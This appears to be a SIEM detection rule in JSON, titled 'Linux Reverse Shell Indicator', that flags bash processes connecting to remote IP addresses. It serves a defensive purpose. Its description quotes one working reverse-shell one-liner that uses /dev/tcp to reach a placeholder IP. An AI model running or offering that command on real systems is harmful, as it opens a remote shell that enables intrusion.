{"description":"Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') Author: Florian Roth. License: https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md","enabled":false,"false_positives":["Unknown"],"filters":[],"from":"now-360s","immutable":false,"index":["apm-*-transaction","auditbeat-*","endgame-*","filebeat-*","packetbeat-*","winlogbeat-*","logs-*"],"interval":"5m","rule_id":"83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871","language":"lucene","output_index":".siem-signals-default","max_signals":100,"risk_score":95,"name":"Linux Reverse Shell Indicator","query":"(process.executable:*\\/bin\\/bash AND (NOT (destination.ip:(\"127.0.0.1\" OR \"0.0.0.0\"))))","meta":{"from":"1m"},"severity":"critical","tags":[],"to":"now","type":"query","threat":[],"version":1,"references":["https://tdm.socprime.com/tdm/info/0"]}
